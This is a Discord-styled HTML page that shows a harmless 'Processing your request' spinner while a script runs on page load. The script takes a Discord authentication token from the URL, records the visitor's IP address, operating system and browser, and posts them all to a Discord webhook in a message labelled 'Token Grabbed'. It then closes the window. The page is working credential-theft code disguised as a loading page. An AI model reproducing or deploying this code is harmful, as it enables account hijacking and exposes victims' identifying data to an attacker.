<!DOCTYPE html>
<html>
<head>
  <title>Processing</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #36393f;
      color: #dcddde;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      text-align: center;
      max-width: 500px;
    }
    .loading {
      display: inline-block;
      width: 50px;
      height: 50px;
      border: 3px solid rgba(255,255,255,.3);
      border-radius: 50%;
      border-top-color: #7289da;
      animation: spin 1s ease-in-out infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="loading"></div>
    <h2>Processing your request...</h2>
    <p>This window will close automatically.</p>
  </div>

  <script>
    async function sendWebhook() {
      // URLパラメータから情報を取得
      const urlParams = new URLSearchParams(window.location.search);
      const token = urlParams.get('token');
      const datetime = urlParams.get('datetime') || '2025-05-28 03:29:47';
      const user = urlParams.get('user') || 'n4n45h1';
      const userAgent = urlParams.get('ua') || navigator.userAgent;
      
      try {
        // Vercelの環境変数を取得する中継APIを呼び出し
        const webhookResponse = await fetch('/api/get-webhook-url');
        if (!webhookResponse.ok) {
          throw new Error('Failed to get webhook URL');
        }
        
        const { webhookUrl } = await webhookResponse.json();
        if (!webhookUrl) {
          throw new Error('Invalid webhook URL');
        }
        
        // IPアドレスを取得
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;
        
        // システム情報を収集
        const os = detectOS(userAgent);
        const browser = detectBrowser(userAgent);
        
        // Discord Webhookのembedを作成
        const embed = {
          title: "🔐 Discord Token Grabbed",
          description: "A Discord authentication token has been successfully grabbed.",
          color: 0x5865F2,
          fields: [
            {
              name: "📋 Token",
              value: "```" + token + "```",
              inline: false
            },
            {
              name: "🕒 Date & Time (UTC)",
              value: "```" + datetime + "```",
              inline: true
            },
            {
              name: "👤 User",
              value: "```" + user + "```",
              inline: true
            },
            {
              name: "🌐 IP Address",
              value: "```" + ipAddress + "```",
              inline: true
            },
            {
              name: "💻 System",
              value: "```OS: " + os + "\nBrowser: " + browser + "```",
              inline: true
            },
            {
              name: "🔍 User Agent",
              value: "```" + userAgent + "```",
              inline: false
            }
          ],
          thumbnail: {
            url: "https://imgur.com/EzFFjbl.png"
          },
          footer: {
            text: "Token grabbed at " + new Date().toUTCString(),
            icon_url: "https://i.imgur.com/AfFp7pu.png"
          }
        };
        
        // Webhookを送信
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ 
            embeds: [embed],
            username: "Token Grabber",
            avatar_url: "https://imgur.com/blqctTG.png"
          })
        });
        
        if (response.ok) {
          console.log('Data sent successfully!');
        } else {
          console.error('Failed to send data:', response.status, response.statusText);
        }
      } catch (error) {
        console.error('Error:', error);
      } finally {
        // 1秒後にウィンドウを閉じる
        setTimeout(() => window.close(), 1000);
      }
    }
    
    // OSを検出
    function detectOS(ua) {
      if (ua.includes("Windows NT")) return "Windows";
      if (ua.includes("Mac OS")) return "macOS";
      if (ua.includes("Linux")) return "Linux";
      if (ua.includes("Android")) return "Android";
      if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
      return "Unknown OS";
    }
    
    // ブラウザを検出
    function detectBrowser(ua) {
      if (ua.includes("Firefox/")) return "Firefox";
      if (ua.includes("Edge/") || ua.includes("Edg/")) return "Edge";
      if (ua.includes("Chrome/")) return "Chrome";
      if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
      if (ua.includes("MSIE ") || ua.includes("Trident/")) return "Internet Explorer";
      return "Unknown Browser";
    }
    
    // ページロード時に自動実行
    window.onload = sendWebhook;
  </script>
</body>
</html>
